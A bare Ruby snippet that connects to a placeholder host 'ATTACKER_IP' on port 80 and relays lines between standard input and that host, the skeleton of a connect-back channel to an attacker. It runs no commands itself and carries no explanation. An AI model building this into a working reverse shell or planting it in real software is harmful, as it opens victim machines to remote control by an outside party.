require 'socket'

s = TCPSocket.open("ATTACKER_IP", 80)
loop do
  s.puts gets
  puts s.gets
end